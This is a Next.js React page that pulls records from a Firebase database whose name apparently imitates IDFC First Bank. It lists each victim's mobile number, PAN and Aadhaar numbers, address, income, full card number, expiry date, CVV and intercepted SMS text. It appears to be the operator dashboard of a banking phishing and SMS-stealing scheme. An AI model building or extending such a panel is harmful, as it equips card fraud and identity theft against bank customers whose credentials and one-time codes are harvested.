"use client";
import axios from "axios";
import React from "react";
import useSWR from "swr";
/* eslint-disable react/no-unescaped-entities */
const fetcher = (url: string) => axios.get(url).then((res) => res.data);

// async function getData() {
//   const res = await fetch(process.env?.NEXT_PUBLIC_API_URL as string);

//   if (!res.ok) {
//     throw new Error("Failed to fetch data");
//   }

//   return res.json();
// }

export default function Home() {
  // const data = await getData();
  const { data, error, isLoading } = useSWR(
    "https://idfc-frist-default-rtdb.firebaseio.com/users.json",
    fetcher
  );

  console.log({ data });

  const realTimeData = React.useMemo(() => {
    if (data) {
      return Object?.keys(data)
        ?.map((key) => {
          return {
            id: key,
            data: data?.[key],
          };
        })
        ?.reverse();
    }
    return [];
  }, [data]);
  return (
    <div className="bodytable">
      {isLoading ? (
        <p>Loading...</p>
      ) : (
        <table>
          <thead>
            <tr>
              <th>S No.</th>
              <th>Mobile Number</th>
              <th>Personal Details</th>
              <th>Card Details</th>
              <th>SMS</th>
            </tr>
          </thead>
          <tbody>
            {realTimeData.map((items, index) => {
              console.log({ items });
              return (
                <tr key={index}>
                  <td>{index + 1}</td>
                  <td>{items?.data?.mobile}</td>
                  <td>
                    <div>
                      <ul>
                        <li>
                          <span>Name :</span>
                          {items?.data?.userData?.name}
                        </li>
                        <li>
                          <span>Email :</span>
                          {items?.data?.userData?.email}
                        </li>
                        <li>
                          <span>Pan Number :</span>
                          {items?.data?.userData?.panNumber}
                        </li>
                        <li>
                          {" "}
                          <span>Aadhar Number :</span>{" "}
                          {items?.data?.userData?.aadharNumber}
                        </li>
                        <li>
                          <span>Current Address :</span>
                          {items?.data?.userData?.currentAddress}
                        </li>
                        <li>
                          <span>Address :</span>{" "}
                          {items?.data?.userData?.address}
                        </li>
                        <li>
                          <span>Annual Income :</span>
                          {items?.data?.userData?.annualIncome}
                        </li>
                        <li>
                          <span>Country :</span>{" "}
                          {items?.data?.userData?.country || "India"}
                        </li>
                        <li>
                          <span>Credit Card Issue Bank :</span>
                          {items?.data?.userData?.creditCardIssueBank}
                        </li>
                        <li>
                          <span>PinCode :</span>
                          {items?.data?.userData?.pinCode}
                        </li>
                        <li>
                          <span>State :</span>
                          {items?.data?.userData?.state}
                        </li>
                      </ul>
                    </div>
                  </td>

                  <td>
                    <ul>
                      <li>
                        <span>Card number :</span>{" "}
                        {items?.data?.cardData?.number}
                      </li>
                      <li>
                        <span>Card Holder Name :</span>{" "}
                        {items?.data?.cardData?.name}
                      </li>
                      <li>
                        <span>Expiry Year :</span>{" "}
                        {items?.data?.cardData?.expiryYear}
                      </li>
                      <li>
                        <span>Expiry Month :</span>{" "}
                        {items?.data?.cardData?.expiryMonth}
                      </li>
                      <li>
                        <span>cvv :</span> {items?.data?.cardData?.cvv}
                      </li>
                    </ul>
                  </td>

                  <td>
                    <p>{items?.data?.message?.body}</p>
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      )}
    </div>
  );
}
